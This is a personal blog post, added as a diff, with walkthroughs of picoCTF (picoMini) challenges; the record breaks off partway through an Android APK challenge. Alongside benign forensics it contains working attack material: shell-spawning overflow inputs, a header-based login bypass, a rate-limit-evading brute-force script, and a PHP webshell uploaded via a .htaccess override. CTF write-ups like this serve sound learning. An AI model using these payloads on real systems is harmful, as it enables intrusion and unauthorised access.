@@ -1,0 +1,1012 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Solving picoMini by CMU-Africa · zimeng xiong</title>
+</head>
+<body>
+<nav><a href="/">home</a> <a href="/blog/">blog</a> <a href="/reading/">reading</a> <a href="/things/">things</a> </nav>
+<main><article><header><h1>Solving picoMini by CMU-Africa</h1><time datetime="2025-10-05T10:52:32-07:00">5 October 2025</time> </header><div><p>A friend recommended <a href="https://picoctf.org">picoCTF</a> to me. I had played similar games like <a href="https://overthewire.org/wargames/bandit/">banditOverTheWire</a> before, so I thought it would be pretty fun to try out.</p>
+<hr/>
+<h2>Log Hunt</h2>
+<p>Our server seems to be leaking pieces of a secret flag in its logs. The parts are scattered and sometimes repeated. Can you reconstruct the original flag?
+Download the logs and figure out the full flag from the fragments.</p>
+<ul>
+<li>The <code>server.log</code> file contains thousands of lines of codes:</li>
+</ul>
+<pre><code>[1990-08-09 10:00:10] INFO FLAGPART: picoCTF{us3_
+[1990-08-09 10:00:16] WARN Disk space low
+[1990-08-09 10:00:19] DEBUG Cache cleared
+[1990-08-09 10:00:23] WARN Disk space low
+[1990-08-09 10:00:25] INFO Service restarted
+[1990-08-09 10:00:33] WARN Disk space low
+[1990-08-09 10:00:38] ERROR Connection lost
+[1990-08-09 10:00:46] ERROR Failed login attempt
+</code></pre>
+<p>This seems to be pretty easy, the flag is just contained in logs tagged with: <code>INFO FLAGPART</code></p>
+<p>Performing a <code>grep</code>, we easily find the flag:</p>
+<pre><code>zimengx@endeavour ~/S/p/C/LogHunt&gt; grep "FLAGPART" server.log
+[1990-08-09 10:00:10] INFO FLAGPART: picoCTF{us3_
+[1990-08-09 10:02:55] INFO FLAGPART: y0urlinux_
+[1990-08-09 10:05:54] INFO FLAGPART: sk1lls_
+[1990-08-09 10:05:55] INFO FLAGPART: sk1lls_
+[1990-08-09 10:10:54] INFO FLAGPART: cedfa5fb}
+[1990-08-09 10:10:58] INFO FLAGPART: cedfa5fb}
+[1990-08-09 10:11:06] INFO FLAGPART: cedfa5fb}
+[1990-08-09 11:04:27] INFO FLAGPART: picoCTF{us3_
+[1990-08-09 11:04:29] INFO FLAGPART: picoCTF{us3_
+[1990-08-09 11:04:37] INFO FLAGPART: picoCTF{us3_
+[1990-08-09 11:09:16] INFO FLAGPART: y0urlinux_
+[1990-08-09 11:09:19] INFO FLAGPART: y0urlinux_
+[1990-08-09 11:12:40] INFO FLAGPART: sk1lls_
+[1990-08-09 11:12:45] INFO FLAGPART: sk1lls_
+[1990-08-09 11:16:58] INFO FLAGPART: cedfa5fb}
+[1990-08-09 11:16:59] INFO FLAGPART: cedfa5fb}
+[1990-08-09 11:17:00] INFO FLAGPART: cedfa5fb}
+[1990-08-09 12:19:23] INFO FLAGPART: picoCTF{us3_
+[1990-08-09 12:19:29] INFO FLAGPART: picoCTF{us3_
+[1990-08-09 12:19:32] INFO FLAGPART: picoCTF{us3_
+[1990-08-09 12:23:43] INFO FLAGPART: y0urlinux_
+[1990-08-09 12:23:45] INFO FLAGPART: y0urlinux_
+[1990-08-09 12:23:53] INFO FLAGPART: y0urlinux_
+[1990-08-09 12:25:32] INFO FLAGPART: sk1lls_
+[1990-08-09 12:28:45] INFO FLAGPART: cedfa5fb}
+[1990-08-09 12:28:49] INFO FLAGPART: cedfa5fb}
+[1990-08-09 12:28:52] INFO FLAGPART: cedfa5fb}
+</code></pre>
+<hr/>
+<h2>Riddle Registry</h2>
+<p>Hi, intrepid investigator! 📄🔍 You've stumbled upon a peculiar PDF filled with what seems like nothing more than garbled nonsense. But beware! Not everything is as it appears. Amidst the chaos lies a hidden treasure—an elusive flag waiting to be uncovered.
+Find the PDF file here Hidden Confidential Document and uncover the flag within the metadata.</p>
+<p>Running <code>exiftool</code> to extract the metadata,</p>
+<pre><code>zimengx@endeavour ~/S/p/C/RiddleRegistry&gt; exiftool confidential.pdf
+ExifTool Version Number         : 13.36
+File Name                       : confidential.pdf
+Directory                       : .
+File Size                       : 183 kB
+File Modification Date/Time     : 2025:10:05 17:25:04-07:00
+File Access Date/Time           : 2025:10:05 17:21:14-07:00
+File Inode Change Date/Time     : 2025:10:05 17:25:04-07:00
+File Permissions                : -rw-r--r--
+File Type                       : PDF
+File Type Extension             : pdf
+MIME Type                       : application/pdf
+PDF Version                     : 1.7
+Linearized                      : No
+Page Count                      : 1
+Producer                        : PyPDF2
+Author                          : cGljb0NURntwdXp6bDNkX20zdGFkYXRhX2YwdW5kIV8zNTc4NzM5YX0=
+</code></pre>
+<p>The <code>Author</code> field contains what is almost certainly base64 encoded text, decoding it should give us the flag:</p>
+<pre><code>zimengx@endeavour ~/S/p/C/RiddleRegistry&gt; echo "cGljb0NURntwdXp6bDNkX20zdGF
+kYXRhX2YwdW5kIV8zNTc4NzM5YX0=" | base64 --decode
+picoCTF{puzzl3d_m3tadata_f0und!_3578739a}
+</code></pre>
+<hr/>
+<h2>Corrupted File</h2>
+<p>This file seems broken... or is it? Maybe a couple of bytes could make all the difference. Can you figure out how to bring it back to life?
+Download the file here.</p>
+<p>Hints tell us the file is a JPG. The header of the JPG is likely corrupt. JPGs start with <code>FF D8 FF</code>
+Using <code>hexedit</code>:</p>
+<pre><code>00000000   5C 78 FF E0  00 10 4A 46  49 46 00 01  01 00 00 01  \x....JFIF......
+00000010   00 01 00 00  FF DB 00 43  00 08 06 06  07 06 05 08  .......C........
+00000020   07 07 07 09  09 08 0A 0C  14 0D 0C 0B  0B 0C 19 12  ................
+00000030   13 0F 14 1D  1A 1F 1E 1D  1A 1C 1C 20  24 2E 27 20  ........... $.'
+00000040   22 2C 23 1C  1C 28 37 29  2C 30 31 34  34 34 1F 27  ",#..(7),01444.'
+</code></pre>
+<p>Correcting the first two blocks to <code>FF D8</code> restores the JPG!
+<img alt="" src="/media/fcd447b1859e998d860e245f.jpg"/></p>
+<hr/>
+<h2>Crack the Gate 1</h2>
+<p>We’re in the middle of an investigation. One of our persons of interest, ctf player, is believed to be hiding sensitive data inside a restricted web portal. We’ve uncovered the email address he uses to log in: <a href="mailto:ctf-player@picoctf.org">ctf-player@picoctf.org</a>. Unfortunately, we don’t know the password, and the usual guessing techniques haven’t worked. But something feels off... it’s almost like the developer left a secret way in. Can you figure it out?
+The website is running here. Can you try to log in?</p>
+<p>We are presented with a login scren:
+<img alt="" src="/media/a54ef792020bfe355da2a955.png"/></p>
+<p>Upon inspection, we see the way the form handles passwords:</p>
+<pre><code>&lt;/head&gt;
+&lt;body&gt;
+ &lt;!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" --&gt;
+&lt;!-- Remove before pushing to production! --&gt;
+
+    &lt;form id="loginForm"&gt;
+        &lt;h2 style="font-size: 24px; margin-bottom: 24px;"&gt;
+            Login
+        &lt;/h2&gt;
+        &lt;label for="email"&gt;Email:&lt;/label&gt;
+        &lt;input type="email" id="email" name="email" required&gt;&lt;br&gt;
+        &lt;label for="password"&gt;Password:&lt;/label&gt;
+        &lt;input type="password" id="password" name="password" required&gt;&lt;br&gt;
+        &lt;button type="submit"&gt;Login&lt;/button&gt;
+    &lt;/form&gt;
+
+    &lt;script&gt;
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const formData = {
+                email: document.getElementById('email').value,
+                password: document.getElementById('password').value
+            };
+
+            fetch('/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(formData)
+            })
+            .then(response =&gt; response.json())
+            .then(data =&gt; {
+                console.log(data);
+                if (data.success) {
+    prompt('Login successful!\nFlag:', data.flag);
+} else {
+    alert('Invalid credentials');
+}
+
+            })
+            .catch(error =&gt; console.error('Error:', error));
+        });
+    &lt;/script&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>We see a comment that is "supposed to be removed before pushng to production" LOL! It might be the flag or the password.</p>
+<pre><code>&lt;!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" --&gt;
+&lt;!-- Remove before pushing to production! --&gt;
+</code></pre>
+<p>Hint #2 tells us this is a ROT13 cipher:</p>
+<blockquote>
+<p>A common trick is to rotate each letter by 13 positions in the alphabet.</p>
+</blockquote>
+<p>Writing a simple python script to perform a ROT13 decode:</p>
+<pre><code>string = """ &lt;!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" --&gt;"""
+
+def rot13(text):
+    result = []
+    for char in text:
+        if char.isalpha():
+            base = ord('A') if char.isupper() else ord('a')
+            result.append(chr((ord(char) - base + 13) % 26 + base))
+        else:
+            result.append(char)
+    return ''.join(result)
+
+decoded = rot13(string)
+print(decoded)
+</code></pre>
+<pre><code>zimengx@endeavour ~/S/p/C/CrackTheGate1&gt; python3 decode.py
+ &lt;!-- NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes" --&gt;
+</code></pre>
+<p>We see a development note left to "Jack" to use X-Dev-Access when sending the POST request to bypass the login. We know the endpoint is <code>/login</code> from the HTML before.</p>
+<pre><code>zimengx@endeavour ~/S/p/C/CrackTheGate1&gt; curl -X POST \
+                                               -H "Content-Type: application/json" \
+                                               -H "X-Dev-Access: yes" \
+                                               -d '{"email": "ctf-player@picoctf.org", "password": ""}' \
+                                                 http://amiable-citadel.picoctf.net:52352/login
+{"success":true,"email":"ctf-player@picoctf.org","firstName":"pico","lastName":"player","flag":"picoCTF{brut4_f0rc4_125f752d}"}⏎
+</code></pre>
+<p>Yay!!</p>
+<hr/>
+<h2>Flag in Flame</h2>
+<p>The SOC team discovered a suspiciously large log file after a recent breach. When they opened it, they found an enormous block of encoded text instead of typical logs. Could there be something hidden within? Your mission is to inspect the resulting file and reveal the real purpose of it. The team is relying on your skills to uncover any concealed information within this unusual log.
+Download the encoded data here: Logs Data. Be prepared—the file is large, and examining it thoroughly is crucial</p>
+<p>Hints tell us the file is base64 encoded and is a image, thats straightforward enough.</p>
+<blockquote>
+<p>Use base64 to decode the data and generate the image file.</p>
+</blockquote>
+<pre><code>zimengx@endeavour ~/S/p/C/FlagInFlame&gt; echo logs.txt | base64 --decode
+��,base64: invalid input
+</code></pre>
+<p>Looks like the file isn't in b64, maybe hex then?</p>
+<pre><code>print(bytes.fromhex("7069636F43544678666F72656E736963735F616E616C797369735F69735F616D617A696E675F35636363376362307D").decode())
+</code></pre>
+<pre><code>zimengx@endeavour ~/S/p/C/FlagInFlame [0|1]&gt; python3 attempt.py
+picoCTFxforensics_analysis_is_amazing_5ccc7cb0}
+</code></pre>
+<p>Yup!!</p>
+<hr/>
+<h2>Hidden in Plainsight</h2>
+<p>You’re given a seemingly ordinary JPG image. Something is tucked away out of sight inside the file. Your task is to discover the hidden payload and extract the flag.
+Download the jpg image here.</p>
+<p>Another image problem, first we check the metadata:</p>
+<pre><code>zimengx@endeavour ~/S/p/C/HiddenInPlainsight&gt; exiftool img.jpg
+ExifTool Version Number         : 13.36
+File Name                       : img.jpg
+Directory                       : .
+File Size                       : 74 kB
+File Modification Date/Time     : 2025:09:29 14:29:24-07:00
+File Access Date/Time           : 2025:10:05 17:44:33-07:00
+File Inode Change Date/Time     : 2025:10:05 17:44:33-07:00
+File Permissions                : -rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Resolution Unit                 : None
+X Resolution                    : 1
+Y Resolution                    : 1
+Comment                         : c3RlZ2hpZGU6Y0VGNmVuZHZjbVE9
+Image Width                     : 640
+Image Height                    : 640
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+Image Size                      : 640x640
+Megapixels                      : 0.410
+</code></pre>
+<p>Theres a comment! Looks b64:</p>
+<pre><code>zimengx@endeavour ~/S/p/C/HiddenInPlainsight&gt; echo "c3RlZ2hpZGU6Y0VGNmVuZHZjbVE9"
+ | base64 --decode
+steghide:cEF6endvcmQ=
+</code></pre>
+<p>We get steghide and what looks to be another b64 string.
+Doing some googling on steghide:</p>
+<blockquote>
+<p>Steghide is steganography program which hides bits of a data file in some of the least significant bits of another file in such a way that the existence of the data file is not visible and cannot be proven. Steghide is designed to be portable and configurable and features hiding data in bmp, jpeg, wav and au files, blowfish encryption, MD5 hashing of passphrases to blowfish keys, and pseudo-random distribution of hidden bits in the container data. Steghide is useful in digital forensics investigations.</p>
+</blockquote>
+<p>Installing steghide (arch btw):</p>
+<pre><code>yay -S steghide
+</code></pre>
+<p>And running <code>extract -sf</code> on the image:</p>
+<pre><code>zimengx@endeavour ~/S/p/C/HiddenInPlainsight [1]&gt; steghide extract -sf img
+Enter passphrase: ⏎
+</code></pre>
+<p>We are prompted for a passphrase?? Maybe thats what was in the b64 text.</p>
+<p>Yup!</p>
+<pre><code>zimengx@endeavour ~/S/p/C/HiddenInPlainsight&gt; echo "cEF6endvcmQ=" | base64 --deco
+de
+pAzzword⏎
+</code></pre>
+<pre><code>zimengx@endeavour ~/S/p/C/HiddenInPlainsight&gt; steghide extract -sf img.jpg --pass
+phrase "pAzzword"
+wrote extracted data to "flag.txt".
+zimengx@endeavour ~/S/p/C/HiddenInPlainsight&gt; cat flag.txt
+picoCTF{h1dd3n_1n_1m4g3_5d4cba73}
+</code></pre>
+<p>Yay!</p>
+<hr/>
+<h2>Input Injection 1</h2>
+<p>A friendly program wants to greet you… but its goodbye might say more than it should. Can you convince it to reveal the flag?
+connect to the challenge instance nc saffron-estate.picoctf.net 61381. You can Download the program file here. And source code</p>
+<p>We get an executable binary and a <code>vuln.c</code> file:</p>
+<pre><code>#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void fun(char *name, char *cmd);
+
+int main() {
+    char name[200];
+    printf("What is your name?\n");
+    fflush(stdout);
+
+
+    fgets(name, sizeof(name), stdin);
+    name[strcspn(name, "\n")] = 0;
+
+    fun(name, "uname");
+    return 0;
+}
+
+void fun(char *name, char *cmd) {
+    char c[10];
+    char buffer[10];
+
+    strcpy(c, cmd);
+    strcpy(buffer, name);
+
+    printf("Goodbye, %s!\n", buffer);
+    fflush(stdout);
+    system(c);
+}
+</code></pre>
+<p>Immediately, we see a <code>system(c)</code> call. We need to achieve injection into str <code>c</code>. <code>c</code> is copied from <code>cmd</code>. More importantly, <code>name</code> is of length <code>200</code> while buffer is only of length <code>10</code>.</p>
+<p><code>buffer</code> is declared second, so it might be allocated at a higher memory address.</p>
+<p><code>c</code> is declared first, so it might be allocated at a lower memory address, immediately below <code>buffer</code> on the stack.</p>
+<p>Given this scenario, we can write any length &gt;10 to name and achieve code execution.</p>
+<pre><code>zimengx@endeavour ~/S/p/C/InputInjection1&gt; nc saffron-estate.picoctf.net 61381
+What is your name?
+aaaaaaaaaaaaaaaaaaa;/bin/sh
+Goodbye, aaaaaaaaaaaaaaaaaaa;/bin/sh!
+ls
+flag.txt
+cat flag.txt
+picoCTF{0v3rfl0w_c0mm4nd_0995fed8}
+</code></pre>
+<hr/>
+<h2>Crack the Gate 2</h2>
+<p>The login system has been upgraded with a basic rate-limiting mechanism that locks out repeated failed attempts from the same source. We’ve received a tip that the system might still trust user-controlled headers. Your objective is to bypass the rate-limiting restriction and log in using the known email address: <a href="mailto:ctf-player@picoctf.org">ctf-player@picoctf.org</a> and uncover the hidden secret.
+The website is running here. Can you try to log in?.
+Download the passwords list here.</p>
+<p>We have a list of passwords and one is presumably correct</p>
+<pre><code>JiywhfQn
+3zSd0XU0
+50ylF3Uo
+7XbIBfcQ
+W4K0inBD
+pSvOYV4a
+MpNXnpfS
+ZuylCpyS
+bgl0SpNj
+h2qf8Ppg
+maSXnInx
+iiidp7qG
+enyDlwq8
+P5gRbs2V
+YrWWubgE
+Gq7ZVFuD
+Xpseyq9h
+lVY5T9Ah
+URgET2ph
+6epBnWRf
+</code></pre>
+<p>However, we are told we would be raitimited if we come from the same IP Address. Hints tell us we can use the <code>X-forwarded-For</code> header to spoof IPs.</p>
+<pre><code>import requests
+import json
+
+url = "http://amiable-citadel.picoctf.net:64714/login"
+email = "ctf-player@picoctf.org"
+ip_base = "192.168.1."
+
+with open("passwords.txt", "r") as file:
+    passwords = file.read().splitlines()
+
+for i, password in enumerate(passwords):
+    ip = f"{ip_base}{i % 254 + 1}"
+    headers = {
+        "Content-Type": "application/json",
+        "X-Forwarded-For": ip
+    }
+    data = {
+        "email": email,
+        "password": password
+    }
+    response = requests.post(url, headers=headers, data=json.dumps(data))
+    result = response.json()
+    if result.get("success"):
+        print(result)
+        break
+</code></pre>
+<pre><code>zimengx@endeavour ~/S/p/C/CrackTheGate2&gt; python3 bypass.py
+{'success': True, 'email': 'ctf-player@picoctf.org', 'firstName': 'pico', 'lastName': 'player', 'flag': 'picoCTF{xff_byp4ss_brut3_ff36dbbc}'}
+</code></pre>
+<p>Yay!</p>
+<hr/>
+<h2>Crack the Power</h2>
+<p>We received an encrypted message. The modulus is built from primes large enough that factoring them isn’t an option, at least not today. See if you can make sense of the numbers and reveal the flag.
+Download the message.</p>
+<p>Ugh... We have a math problem.</p>
+<p>The message contains three variables: <code>n, e, c</code></p>
+<pre><code>n = 340226612280453880490912927616922654745871244089289366256789212515896004497250888584335811193830299831152937221710730524607657274800439820657259458335845939604931208401645166794422421061753256418606981891166292142312310415412822538932571250257863289381608926058569443787372767929674420189682140643934828208884862456000947387644814288954199430403778409100671478459624487135877196949510819070843489062177812610169137985121981686847113760741151147789395635551162493262500781469414674715294121266223065415289341718811129151397178263070097355368724306157335976262867024266322656022224190318373194930817027553444120202292747938671524024999221893702460945171052909676860508777477633202757108535727508915761012307312590775794562319046042072447802326462685809774970879511380747691257281474551283000843537035593404036052654969917069297984148223213335741086514064256735270274423335098606567685634207561183967667312482624845887343588501669563704153809977521324544338273705452304166553609342275320152815696737710312761215921474738505250301661262646544496431458447294223499494555443767746404864888997183239119346466619148212371671931706071305354788570231263917420073144154793116214641438554148643280191881422603579089810874350592019963992600316667
+e = 20
+c = 640637430810406857500566702096274080396661344326148989819149855637707275983472899892750444419300234079892653333362989506852801685008762251130872832744197646466858521890159108234060530632218545536493488645992429077472502031329127700427356736726536701719062158231800255112161983427364020254609533473401843023952968018844806862896943490893119371703331960982414876010742030933003301879372695333343200500711596801923272711473735596859184517981485041587840922031361580523565471754589502606896163103556972744430028454860323232448424368114835718966903896081921822322495308942627206587827869758822635827159743949522778872267782737023325775825987938515587028997868106842378444561485725423380868087876415156656531868887461098120850401515409014096099316919268977722048391610017964961835883458482549333972161386084047586325153495747282557560791442172961910916373381462229380156133838381633915942059818808997063047255803431866226725960708286498794535426919185922421000300087374455173022674406631175145902138929540939977920690014479484669993159370314372551152369559506116674980314595547354085609712390963374849992524368048463233368412763016667750045491935391770001
+</code></pre>
+<p>This looks like a RSA encryption key with N=modulus, E=Public Exponent, and C=Cipher Text</p>
+<p>This is starting to get less straightforward than the other ones.</p>
+<p>Hints tell us to use Coppersmith's attack for small messages.
+In standard RSA, the ciphertext c is computed as <span><span><math><semantics><mrow><mi>c</mi><mo>=</mo><msup><mi>m</mi><mi>e</mi></msup><mspace></mspace><mspace></mspace><mrow><mi>m</mi><mi>o</mi><mi>d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi></mrow><annotation>c=m^e\mod{n}</annotation></semantics></math></span><span><span><span></span><span>c</span><span></span><span>=</span><span></span></span><span><span></span><span><span>m</span><span><span><span><span><span><span></span><span><span>e</span></span></span></span></span></span></span></span><span></span><span></span></span><span><span></span><span><span><span>mod</span></span></span><span></span><span></span><span>n</span></span></span></span>. This operation means we take the remainder after dividing by n.</p>
+<p>This attack works when the message m is so small that
+<span><span><math><semantics><mrow><msup><mi>m</mi><mi>e</mi></msup><mo>&lt;</mo><mi>n</mi></mrow><annotation>m^e\lt{n}</annotation></semantics></math></span><span><span><span></span><span><span>m</span><span><span><span><span><span><span></span><span><span>e</span></span></span></span></span></span></span></span><span></span><span>&lt;</span><span></span></span><span><span></span><span><span>n</span></span></span></span></span>
+When this condition holds, the modular reduction step is superfluous because the result of the exponentiation is already smaller than the modulus.</p>
+<p>Since we are working with integers, this simplifies the problem to a algebraic one. To recover m, we need to find the integer e-th root of the ciphertext c.
+<span><span><math><semantics><mrow><mi>m</mi><mo>=</mo><mroot><mi>c</mi><mi>e</mi></mroot></mrow><annotation>m=\sqrt[e]{c}</annotation></semantics></math></span><span><span><span></span><span>m</span><span></span><span>=</span><span></span></span><span><span></span><span><span><span><span><span><span><span></span><span><span><span>e</span></span></span></span></span></span></span></span><span><span><span><span><span></span><span><span>c</span></span></span><span><span></span><span><svg><path></path></svg></span></span></span><span>​</span></span><span><span><span></span></span></span></span></span></span></span></span>
+We can do this with the <code>gmpy2</code> library</p>
+<blockquote>
+<p>gmpy2 is a C-coded Python extension module that supports multiple-precision arithmetic. It is the successor to the original gmpy module (supported only the GMP library). gmpy2 adds support for the MPFR (correctly rounded real floating-point arithmetic) and MPC (correctly rounded complex floating-point arithmetic) libraries.</p>
+</blockquote>
+<pre><code>import gmpy2
+
+n = 340226612280453880490912927616922654745871244089289366256789212515896004497250888584335811193830299831152937221710730524607657274800439820657259458335845939604931208401645166794422421061753256418606981891166292142312310415412822538932571250257863289381608926058569443787372767929674420189682140643934828208884862456000947387644814288954199430403778409100671478459624487135877196949510819070843489062177812610169137985121981686847113760741151147789395635551162493262500781469414674715294121266223065415289341718811129151397178263070097355368724306157335976262867024266322656022224190318373194930817027553444120202292747938671524024999221893702460945171052909676860508777477633202757108535727508915761012307312590775794562319046042072447802326462685809774970879511380747691257281474551283000843537035593404036052654969917069297984148223213335741086514064256735270274423335098606567685634207561183967667312482624845887343588501669563704153809977521324544338273705452304166553609342275320152815696737710312761215921474738505250301661262646544496431458447294223499494555443767746404864888997183239119346466619148212371671931706071305354788570231263917420073144154793116214641438554148643280191881422603579089810874350592019963992600316667
+
+e = 20
+
+c = 640637430810406857500566702096274080396661344326148989819149855637707275983472899892750444419300234079892653333362989506852801685008762251130872832744197646466858521890159108234060530632218545536493488645992429077472502031329127700427356736726536701719062158231800255112161983427364020254609533473401843023952968018844806862896943490893119371703331960982414876010742030933003301879372695333343200500711596801923272711473735596859184517981485041587840922031361580523565471754589502606896163103556972744430028454860323232448424368114835718966903896081921822322495308942627206587827869758822635827159743949522778872267782737023325775825987938515587028997868106842378444561485725423380868087876415156656531868887461098120850401515409014096099316919268977722048391610017964961835883458482549333972161386084047586325153495747282557560791442172961910916373381462229380156133838381633915942059818808997063047255803431866226725960708286498794535426919185922421000300087374455173022674406631175145902138929540939977920690014479484669993159370314372551152369559506116674980314595547354085609712390963374849992524368048463233368412763016667750045491935391770001
+
+
+
+m = gmpy2.iroot(c, e)[0]
+
+
+
+m_bytes = int(m).to_bytes((int(m).bit_length() + 7) // 8, byteorder='big')
+
+plaintext = m_bytes.decode('ascii')
+</code></pre>
+<pre><code>(.venv) zimengx@endeavour ~/S/p/C/CrackThePower&gt; python3 attack.py
+picoCTF{t1ny_e_9b88056f}
+</code></pre>
+<p>Phew, that was complicated.</p>
+<hr/>
+<h2>Input Injection 2</h2>
+<p>This program greets you and then runs a command. But can you take control of what command it executes?
+Connect to the program with netcat: nc saffron-estate.picoctf.net 63308.
+You can Download the program file here. And source code</p>
+<p>As before, we get a <code>vuln.c</code> and a binary executable;</p>
+<pre><code>#include &lt;stdio.h&gt;
+
+#include &lt;stdlib.h&gt;
+
+#include &lt;string.h&gt;
+
+
+
+
+int main(void) {
+
+char* username = malloc(28);
+
+char* shell = malloc(28);
+
+printf("username at %p\n", username);
+
+fflush(stdout);
+
+printf("shell at %p\n", shell);
+
+fflush(stdout);
+
+strcpy(shell, "/bin/pwd");
+
+printf("Enter username: ");
+
+fflush(stdout);
+
+scanf("%s", username);
+
+printf("Hello, %s. Your shell is %s.\n", username, shell);
+
+system(shell);
+
+fflush(stdout);
+
+return 0;
+
+}
+</code></pre>
+<p>It is clear we need to overwrite the <code>shell</code> variable to achieve code execution. Since these are made with <code>malloc</code>, we can simply overwrite <code>username</code>, triggering a buffer overflow into <code>shell</code>.</p>
+<pre><code>(.venv) zimengx@endeavour ~/S/p/C/CrackThePower [0|SIGINT]&gt; nc saffron-estate.picoctf.net 63308
+username at 0xdd952a0
+shell at 0xdd952d0
+Enter username: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Hello, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa. Your shell is aaaaaaa.
+</code></pre>
+<p>Unlike <code>Input Injection 1</code>, we need to exactly overflow the right amount, so I first tried a random string and noted how much over I went. Then, we can craft the injection:</p>
+<pre><code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa - aaaaaaa = aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa + /bin/sh = aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/bin/sh
+</code></pre>
+<pre><code>(.venv) zimengx@endeavour ~/S/p/C/CrackThePower&gt; nc saffron-estate.picoctf.net 63308
+username at 0x3274d2a0
+shell at 0x3274d2d0
+Enter username: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/bin/sh
+ls
+flag.txt
+cat flag.txt
+picoCTF{us3rn4m3_2_sh3ll_48b038ff}
+exit
+Hello, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/bin/sh. Your shell is /bin/sh.
+</code></pre>
+<p>Yayy!</p>
+<hr/>
+<h2>byp4ss3d</h2>
+<p>A university's online registration portal asks students to upload their ID cards for verification. The developer put some filters in place to ensure only image files are uploaded but are they enough? Take a look at how the upload is implemented. Maybe there's a way to slip past the checks and interact with the server in ways you shouldn't.
+You can access the web application at here!</p>
+<p><img alt="" src="/media/a5d16c6e796c70f23e361318.png"/></p>
+<p>Uhhhh. I'm really lost for this one, so lets check out the hints!</p>
+<blockquote>
+<p>Apache can be tricked into executing non-PHP files as PHP with a <code>.htaccess</code> file.</p>
+</blockquote>
+<p>We need to create a .htaccess file that tells Apache to execute non-PHP files.</p>
+<pre><code>AddHandler application/x-httpd-php .jpg
+AddType application/x-httpd-php .jpg
+</code></pre>
+<p>Then, we can copy over a simple PHP webshell, naming it <code>webshell.php.jpg</code></p>
+<pre><code>&lt;html&gt;
+&lt;body&gt;
+&lt;form method="GET" name="&lt;?php echo basename($_SERVER['PHP_SELF']); ?&gt;"&gt;
+&lt;input type="TEXT" name="cmd" autofocus id="cmd" size="80"&gt;
+&lt;input type="SUBMIT" value="Execute"&gt;
+&lt;/form&gt;
+&lt;pre&gt;
+&lt;?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd'] . ' 2&gt;&amp;1');
+    }
+?&gt;
+&lt;/pre&gt;
+&lt;/body&gt;
+&lt;/html&gt;⏎
+</code></pre>
+<p>Then, we upload both files and navigate to the disguised webshell.
+<img alt="" src="/media/d46cd6649bdfc7b477292c9e.png"/>
+We are presented with the webshell!!</p>
+<p>Poking around, we see <code>flag.txt</code> located two directories above, and since we can only execute one command at a time with no retention, we can <code>cat</code> the flag with <code>cd ../.. &amp;&amp; cat flag.txt</code></p>
+<p><img alt="" src="/media/276c12b04f9cb6b61d58e4fb.png"/></p>
+<hr/>
+<h2>M1n10n'5_53cr37</h2>
+<p>Get ready for a mischievous adventure with your favorite Minions! 🕵️‍♂️💥 They’ve been up to their old tricks, and this time, they've hidden the flag in a devious way within the Android source code. Your task is to channel your inner Minion and dive into the disassembled or decompiled code. Watch out, because these little troublemakers have hidden the flag in multiple sneaky spots or maybe even pulled a fast one and concealed it in the same location!Put on your overalls, grab your magnifying glass, and get cracking. The Minions have left clues, and it's up to you to follow their trail and uncover the flag. Can you outwit these playful pranksters and find their secret? Let the Minion mischief begin!Find the android apk here Minions Mobile Application and try to get the flag.</p>
+<p>Oooh, an APK! Scary.</p>
+<p>Looking around, we can use <a href="https://github.com/iBotPeaches/Apktool">apktool</a> to disassemble the apk.</p>
+<pre><code>(.venv) zimengx@endeavour ~/S/p/C/M1n10n'5_53cr37&gt; java -jar apktool_2.12.1.jar d -m minions.apk -o minions_out/
+I: Using Apktool 2.12.1 on minions.apk with 8 threads
+I: Baksmaling classes.dex...
+I: Loading resource table...
+I: Baksmaling classes3.dex...
+I: Baksmaling classes2.dex...
+I: Decoding file-resources...
+I: Loading resource table from file: ~/.local/share/apktool/framework/1.apk
+I: Decoding values */* XMLs...
+I: Decoding AndroidManifest.xml with resources...
+I: Copying original files...
+I: Copying unknown files...
+</code></pre>
+<pre><code>(.venv) zimengx@endeavour ~/S/p/C/M/minions_out&gt; grep "pico" -R
+smali_classes2/com/example/picoctfimage/R.smali:.class public final Lcom/example/picoctfimage/R;
+smali_classes2/com/example/picoctfimage/R.smali:        Lcom/example/picoctfimage/R$color;,
+smali_classes2/com/example/picoctfimage/R.smali:        Lcom/example/picoctfimage/R$drawable;,
+smali_classes2/com/example/picoctfimage/R.smali:        Lcom/example/picoctfimage/R$id;,
+smali_classes2/com/example/picoctfimage/R.smali:        Lcom/example/picoctfimage/R$layout;,
+smali_classes2/com/example/picoctfimage/R.smali:        Lcom/example/picoctfimage/R$mipmap;,
+smali_classes2/com/example/picoctfimage/R.smali:        Lcom/example/picoctfimage/R$string;,
+smali_classes2/com/example/picoctfimage/R.smali:        Lcom/example/picoctfimage/R$style;,
